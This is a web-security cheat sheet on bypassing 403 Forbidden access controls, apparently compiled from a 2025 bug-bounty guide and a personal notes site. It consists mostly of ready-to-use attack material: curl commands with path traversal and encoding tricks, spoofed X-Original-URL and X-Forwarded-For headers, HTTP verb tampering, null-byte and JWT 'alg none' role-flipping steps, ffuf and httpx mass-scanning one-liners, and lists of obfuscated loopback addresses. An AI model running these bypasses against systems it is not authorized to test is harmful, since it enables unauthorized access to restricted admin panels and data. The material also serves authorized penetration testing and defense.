---
tags:
  - Web
---

# :material-lock-open-alert: 403 Bypass

<span class="pill pill-medium">access control</span> <span class="pill pill-info">web</span>

A `403 Forbidden` usually means the **edge** (reverse proxy / WAF / gateway) is blocking a path the back-end would happily serve. The game is to reword the request so the proxy sees something allowed while the origin still routes to the forbidden resource.

!!! abstract "TL;DR"
    Fuzz the path (`/admin` → `/admin/`, `/./admin`, `/admin%20`), swap the method, and spray `X-Forwarded-*` / `X-Original-URL` headers. What the front-end forbids, the back-end may still hand over.

## :material-tools: Tooling

- [`nomore403`](https://github.com/devploit/nomore403) — automates the whole matrix of path/header/method bypasses.
- [`4-ZERO-3`](https://github.com/Dheerajmadhukar/4-ZERO-3) — bash automation over path tricks, header injection and method changes for 403/401. Noisy on false positives, so verify every hit by hand against content length and body.

    ```bash
    bash 403-bypass.sh -u https://target.com/secret --exploit
    ```

- **Burp 403 Bypass extension** — feed the forbidden request to it and it replays the header/method/path matrix for you; findings land in the Burp dashboard. Faster than hand-testing each variant in Repeater.
- `nmap` first, to learn which methods the server even admits to:

    ```bash
    nmap --script http-methods -p80,443 example.com
    ```

    ```text
    PORT    STATE SERVICE
    80/tcp  open  http
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    443/tcp open  https
    | http-methods:
    |_  Supported Methods: GET HEAD
    ```

- `ffuf`, to cross every bypass header against every path payload and route the whole run through Burp for review:

    ```bash
    cat payloads/403_header_payloads.txt | while read header; do ffuf -w payloads/403_url_payloads.txt:PATH -u https://example.com/PATH -H "$header" -mc 200 -fs 0 -x http://172.23.96.1:8080; done
    ```

    Wordlists: [403_header_payloads.txt](https://github.com/coffinxp/payloads) and [403_url_payloads.txt](https://github.com/coffinxp/payloads).

!!! loot "What a real ffuf sweep coughs up"
    Same endpoint, two different injected headers — note how little the winning payloads have in common.

    With `Base-Url: 127.0.0.1`:

    ```text
    %3b%2f%2e.
    %2f
    %3b%2f..
    ;/%2f%2f../
    ;/%2e.
    ;/%2f/..%2f
    ;/%2f/../
    ;/.%2e
    ;/..
    ;/..%2f
    ;/..%2f/
    ;/../%2f/
    ;/..%2f//
    ;///..//
    ?
    ?#
    ?.php
    ?;
    ??
    /%2f/
    ///
    //%2f
    %2f%2f%2f
    %2f/%2f
    %2f//
    ```

    With `Client-Ip: 127.0.0.1`:

    ```text
    %3b/%2f%2f../
    %3b%2f%2e%2e
    %2f?;
    #
    %2f
    %3b%2f%2e.
    %3b//%2f../
    %3b/%2e.
    %2f%2f
    %3b%2f..
    %3b/..
    %2f/
    #?
    /
    /#
    /%2e%2f/
    /%2e/
    /%2e//
    /%2f
    /..;/../
    /..;//../
    /.//
    /./
    //
    //./
    ```

*Automation notes above from "The Ultimate Guide to 403 Forbidden Bypass (2025 Edition)" by [coffinxp](https://medium.com/@coffinxp).*

Mass 403→200 discovery oneliner:

```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 \
  | unfurl format %s://%d \
  | httpx -path //login -mc 200 -t 300 -nc -silent
```

(The trick baked in above: request `//login` — a doubled slash the proxy ACL misses but the origin normalizes.)

## :material-format-list-bulleted: Path & header tricks

=== "Path mangling"

    ```text
    /admin        -> 403
    /admin/       -> 200
    //admin//
    /./admin/./
    /admin/.
    /admin%20
    /admin%09
    /admin?
    /admin#
    /admin..;/
    /%2e/admin
    /admin/~
    /ADMIN  /Admin        (case)
    /admin.json  /admin.html  (extension confusion)
    ```

=== "Header spoofing"

    ```http
    X-Original-URL: /admin
    X-Rewrite-URL: /admin
    X-Forwarded-For: 127.0.0.1
    X-Forwarded-Host: localhost
    X-Custom-IP-Authorization: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Client-IP: 127.0.0.1
    Referer: https://target/admin
    ```

=== "Method swap"

    ```text
    GET -> POST -> PUT -> HEAD -> OPTIONS -> TRACE
    X-HTTP-Method-Override: GET
    ```

## :material-swap-horizontal: HTTP method tampering

*From "The Ultimate Guide to 403 Forbidden Bypass (2025 Edition)" by [coffinxp](https://medium.com/@coffinxp).*

Access rules are usually written for `GET` and `POST` because that is all anyone expected. Everything else — WebDAV verbs especially — often falls through to the origin unchecked. Walk the whole verb list, not just three of them:

```bash
curl -X OPTIONS --path-as-is https://example.com/private/
curl -X GET --path-as-is https://example.com/private/
curl -X POST --path-as-is https://example.com/private/
curl -X PUT --path-as-is https://example.com/private/
curl -X DELETE --path-as-is https://example.com/private/
curl -X PATCH --path-as-is https://example.com/private/
curl -X HEAD --path-as-is https://example.com/private/
curl -X TRACE --path-as-is https://example.com/private/
curl -X CONNECT --path-as-is https://example.com/private/
curl -X PROPFIND --path-as-is https://example.com/private/
curl -X MKCOL --path-as-is https://example.com/private/
curl -X COPY --path-as-is https://example.com/private/
curl -X MOVE --path-as-is https://example.com/private/
curl -X LOCK --path-as-is https://example.com/private/
curl -X UNLOCK --path-as-is https://example.com/private/
curl -X SEARCH --path-as-is https://example.com/private/
```

- `-X` switches the HTTP method.
- `--path-as-is` stops URL normalisation — mandatory once encoded or traversal paths are in play.

### Why `--path-as-is` matters

curl tidies up paths before sending, which quietly destroys the exact malformation you are trying to test. Say the target is `https://example.com/../admin/`.

Without it, curl collapses the traversal and sends `https://example.com/admin/`:

```bash
curl -X GET https://example.com/../admin/
```

With it, the literal `/../admin/` goes out on the wire — and that difference is frequently the whole bypass:

```bash
curl -X GET --path-as-is https://example.com/../admin/
```

!!! tip "Enumerate before you spray"
    Send `OPTIONS` first to learn which methods the server advertises, then hand the rest to Burp Intruder and brute the unadvertised ones too — servers routinely accept verbs they refuse to list.

## :material-format-header-pound: Header manipulation

*From "The Ultimate Guide to 403 Forbidden Bypass (2025 Edition)" by [coffinxp](https://medium.com/@coffinxp).*

The commonly abused set, with the values that actually get results:

| Header | Example value | Purpose / notes |
| --- | --- | --- |
| `X-Original-URL` | `/admin` | Access restricted paths via rewritten URLs |
| `X-Rewrite-URL` | `/admin` | Similar to `X-Original-URL`; processed by some proxies |
| `X-Custom-IP-Authorization` | `127.0.0.1` | Spoof internal IP (localhost) |
| `X-Forwarded-For` | `127.0.0.1` | Spoof client IP to appear as localhost |
| `X-Client-IP` | `127.0.0.1` | Another way to impersonate internal IP |
| `X-Host` | `localhost` | Manipulate host-based access controls |
| `Referer` | `http://trustedsite.com/` | Trick server into trusting the source of the request |

`X-Original-URL` / `X-Rewrite-URL` override the requested path after the proxy has already made its allow/deny decision — request something boring, get served something forbidden. Nginx front-ends are the classic case:

```bash
curl -H "X-Original-URL: /admin" https://example.com/some-page
curl -H "X-Rewrite-URL: /admin" https://example.com/some-page
```

### Custom User-Agent

Some 403s are aimed at your tooling, not at you — the filter simply hates seeing `curl` or Burp in the `User-Agent`. Look like a browser and the block evaporates:

```bash
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://example.com/private/
```

## :material-file-tree: Path fuzzing & encoding

*From "The Ultimate Guide to 403 Forbidden Bypass (2025 Edition)" by [coffinxp](https://medium.com/@coffinxp).*

The proxy blocks the string `/admin`; it does not block every string that *resolves* to `/admin` after the origin normalises it.

=== "URL encoding"

    ```bash
    curl -g --path-as-is "https://example.com/%2e%2e/admin"          # ../
    curl -g --path-as-is "https://example.com/%2e%2e%2fadmin"        # ../admin
    curl -g --path-as-is "https://example.com/%2e%2e%2f%61dmin"      # ../admin with 'a' encoded
    curl -g --path-as-is "https://example.com/%2e%2e/%2e%2e/admin"   # ../../admin
    curl -g --path-as-is "https://example.com/%2e%2e/%2fadmin"       # ..//admin
    curl -g --path-as-is "https://example.com/%20/admin"             # space/admin
    curl -g --path-as-is "https://example.com/%2e%2fadmin"           # ./admin
    curl -g --path-as-is "https://example.com/admin%2f"              # admin/
    curl -g --path-as-is "https://example.com/admin%252f"            # admin%2f (double encoded)
    curl -g --path-as-is "https://example.com/admin%2e%2e%2f"        # admin../
    ```

=== "Path tricks"

    | Trick | Example | Purpose |
    | --- | --- | --- |
    | Add a trailing slash | `/admin/` | Bypass filters expecting exact match (`/admin`) |
    | Add `..;/` | `/..;/admin` | Bypass via path confusion |
    | Double slashes | `//admin//` | Bypass normalization rules |
    | Add a dot at the end | `/admin.` | May trick poorly written regex or filters |
    | URL-encode the slash | `/admin%2f` | Evade path filters with encoding |
    | Add random extension | `/admin.php`, `/admin.json` | Some servers ignore unknown extensions |
    | Backslashes or mixed slashes | `\admin`, `/admin\/` | Break or confuse path parsers |
    | Trailing semicolon or space | `/admin;`, `/admin%20` | May confuse parsers or match loosely |
    | Unicode tricks | `/admin%c0%af`, `/admin%ef%bc%8f` | Unicode slash bypasses |
    | Append junk param or fragment | `/admin?foo=bar#` | May bypass path-only checks |

=== "Case manipulation"

    ```bash
    curl https://example.com/admin
    curl https://example.com/Admin
    curl https://example.com/ADMIN
    curl https://example.com/aDmiN
    curl https://example.com/adMin
    curl https://example.com/AdMiN
    curl https://example.com/aDMIN
    curl https://example.com/ADMIn
    ```

=== "Suffixes"

    ```bash
    curl https://example.com/admin.json
    curl https://example.com/admin.css
    curl https://example.com/admin.js
    curl https://example.com/admin.html
    curl https://example.com/admin.php
    curl https://example.com/admin.aspx
    curl https://example.com/admin.xml
    curl https://example.com/admin.txt
    curl https://example.com/admin.bak
    curl https://example.com/admin.old
    curl https://example.com/admin.zip
    curl https://example.com/admin.tar.gz
    ```

    Sloppy routing means `/admin` is guarded while `/admin.json` reaches the same handler untouched.

## :material-tune-variant: Parameter, token & protocol tricks

*From "The Ultimate Guide to 403 Forbidden Bypass (2025 Edition)" by [coffinxp](https://medium.com/@coffinxp).*

### Parameter tampering

When the ACL matches on the path only, anything after `?` is invisible to it — and appending a parameter is sometimes enough to change which rule fires:

```bash
curl "https://example.com/admin?unused_param=1"
curl "https://example.com/admin?redirect=allowed"
curl "https://example.com/admin?debug=true"
curl "https://example.com/admin?access=granted"
curl "https://example.com/admin?token=123"
```

### JWT token tampering

If the 403 comes from a role claim rather than the edge, attack the token: decode it at [jwt.io](https://jwt.io), flip `"role": "user"` to `"role": "admin"`, strip the signature (`alg` → `none`), and resend. It only works when the server trusts the token without verifying it — which is exactly the bug you are testing for. Details in [JWT](jwt.md).

```bash
curl -H "Authorization: Bearer <MODIFIED_JWT>" https://example.com/adminarea
```

### Null byte injection

`%00` truncates the path in languages whose string handling is still C underneath, so the check sees one path and the filesystem sees another:

```bash
curl --path-as-is "https://example.com/admin.php%00.html"
curl --path-as-is "https://example.com/config.php%00.json"
curl --path-as-is "https://example.com/login.php%00?redirect=admin"
curl --path-as-is "https://example.com/user/profile%00.php"
curl --path-as-is "https://example.com/images/logo%00.jpg"
curl --path-as-is "https://example.com/admin%00.php"
curl --path-as-is "https://example.com/secret%00file.txt"
curl --path-as-is "https://example.com/uploads/file%00.zip"
```

### HTTP version downgrade

Legacy compatibility paths tend to skip the modern checks. Force HTTP/1.0 and see whether the rules still apply:

```bash
curl -http1.0 https://example.com/admin
curl -http1.0 https://example.com/secret
curl -http1.0 https://example.com/config
curl -http1.0 https://example.com/dashboard
```

### Proxy & IP spoofing

If the block is IP-based, change the IP — really, or by assertion:

```bash
proxychains curl http://example.com/private/
```

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/private/
curl -H "X-Real-IP: 127.0.0.1" http://example.com/private/
```

### Switch between HTTP and HTTPS

Access control configured on one listener and forgotten on the other is depressingly common:

```bash
curl http://example.com/private/
curl https://example.com/private/
```

```text
http://example.com/private/https://example.com/private/
```

### Alternate subdomains & ports

The restriction usually lives on the main hostname. The same application, mounted on a dev host or a stray port, frequently has none:

```text
https://admin.example.com/admin

https://dev.example.com/admin

https://example.com:8080/admin

https://example.com:8443/admin

https://example.com:8000/admin
```

### Skipping the Host header

Drop the `Host` header entirely. A misconfigured proxy or legacy backend may fill in `127.0.0.1` or `localhost` for you and then treat the request as internal traffic — which is the trusted path you were locked out of.

### Wayback Machine

A path that returns 403 today may have been public last year, and the archive kept a copy. Free content, zero requests to the target:

```text
https://web.archive.org/web/*/https://example.com/secret-file.txt
```

The `*` asks for every snapshot regardless of date — handy for old admin panels, backup files and endpoints that were pulled rather than fixed.

## :material-ip-network: Localhost/ACL check bypass

When the control is "only `127.0.0.1` may reach this", these representations frequently defeat a naive string check:

```text
127.0.0.1:80        127.0.0.1:443       127.0.0.1:22
127.1:80            127.000000000000000.1
@0/                 localhost           0.0.0.0:80
localhost:80        :80                 0
[::]:25             [::]:3128           [0000::1]:80
[0:0:0:0:0:ffff:127.0.0.1]
①②⑦.⓪.⓪.⓪          127。0。0。1          127%E3%80%820%E3%80%820%E3%80%821
127.127.127.127     127.0.1.3           127.0.0.0
2130706433          3232235521          3232235777
0177.0000.0000.0001 00000177.00000000.00000000.00000001
017700000001        0x7f000001          0xc0a80014
0x7f.0x00.0x00.0x01 0x0000007f.0x00000000.0x00000000.0x00000001
127.000000000000.1  localhost:+11211aaa localhost:00011211aaaa
127.1               127.0.1
```

`①②⑦` (enclosed digits), `127。0。0。1` (ideographic full stop `%E3%80%82`), decimal (`2130706433`), and hex (`0x7f000001`) all resolve to loopback on many stacks while sailing past a blocklist that only knows `127.0.0.1`.

## :material-link-variant: Related

- The ACL-evasion IP set overlaps with [SSRF](ssrf.md) filter bypasses.
- Pairs with [Auth Bypass](auth-bypass.md) and [HTTP Request Smuggling](request-smuggling.md) for reaching internal paths.
- Reference: [nomore403](https://github.com/devploit/nomore403).
